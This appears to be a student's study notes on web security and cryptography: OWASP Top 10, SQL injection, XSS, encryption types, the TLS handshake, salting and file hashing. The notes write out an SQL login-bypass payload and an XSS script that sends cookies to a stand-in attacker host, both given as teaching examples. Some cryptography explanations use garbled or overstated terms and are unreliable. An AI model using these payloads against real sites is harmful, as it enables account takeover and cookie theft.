# Week 7 - Web Security & Cryptography

## What i learned

### OWASP Top 10
1. A01 Broken access control - have access to strangers data
2. A05 Security Misconfiguration - default passwords, opened services, verbose error
3. A09 Logging Failures - no logs -- no investigation

### SQLi
Good request :
SELECT * FROM users WHERE username='admin' AND password='123456'
Attack (in password field): ' OR '1'='1
SELECT * FROM users WHERE username='admin' AND password='' OR '1'='1'
'1'='1' always true -- login without password

Defence: Prepared statements, input validation, WAF
### XSS
Attacker put in entry field:
<script>fetch('http://evil.com/steal?c='+document.cookie)</script>

When victim's open page -- script is running -- cookies goingt to attacker
Types: Stored (saved on server), Reflected (in URL), DOM-based (in JS)

### Cryptography
Symmetrical - one key for cryption and encryption - AES 256 - disk cryption, wifi, vpn
Asymetrical - one public key for cryption and one private key for encryption - RSA - HTTPS, SSH, email, signature
Hash - unilateral conversion -- fixed string - SHA 256 - passwords, file integrity

### TLS Handshake
1. Browser -- Server: “Hello, I want HTTPS” (Client Hello)
2. Server -- Browser: “Here is my certificate” (contains public key)
3. Browser verifies certificate through CA (Certificate Authority)
4. Browser generates random session key (symmetric)
5. Browser encrypts session key with server's public key -- sends
6. Server decrypts with private key -- receives session key
7. Further communication via symmetric encryption (faster)

Summary: asymmetric - for key exchange, symmetric - for data

### Salt
If we had two identical password for example "qwerty", hash for both without salt will be :
┌──(kali㉿kali)-[~]
└─$ echo "password123" | sha256sum
57db1253b68b6802b59a969f750fa32b60cb5cc8a3cb19b87dac28f541dc4e2a  -
┌──(kali㉿kali)-[~]
└─$ echo "password123" | sha256sum
57db1253b68b6802b59a969f750fa32b60cb5cc8a3cb19b87dac28f541dc4e2a  -

But if we using salt it would be: (salt simulation)
┌──(kali㉿kali)-[~]
└─$ echo "password123salt_x7k2p" | sha256sum
echo "password123salt_m9q1r" | sha256sum
28d5b60919e39bf085c83cf7426d78c4f137af696ab341deb776b64eea64edd1  -
2b518aadd9012d311030da23158d7836b214caa0ad675a8d9f0f1c288b354da5  -

## Tools used
Kali, virustotal and powershell

## Lab results
I did how to crypt and encrypt data or files using symetrical/hash using kali, i saw how salting does and why its important to different hashes when attacker steal's data
I also did with powershell comand :
PS C:\WINDOWS\system32> Get-FileHash C:\Windows\System32\notepad.exe -Algorithm SHA256
Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          84B484FD3636F2CA3E468D2821D97AACDE8A143A2724A3AE65F48A33CA2FD258       C:\Windows\System32\notepad.exe

And i checked him on virustotal: it was clear because File distributed by Microsoft - virustotal known this file hash, but if malvare disguises itself as notepad.exe but has a different hash, VirusTotal will show detections. That is why we need check the hash and not the file name. The name can be faked, but the hash cannot

## Key takeaways
1. Using salt is neccesery for securing
2. Always check hash on virustotal, but also check where file from (appdata/temp - no system file), and check when file was created. Virus total can 0/72 for 0-day or FUD so be careful
3. Always use Prepared statements on SQL
4. Always use HTTPS and for sites Output encoding
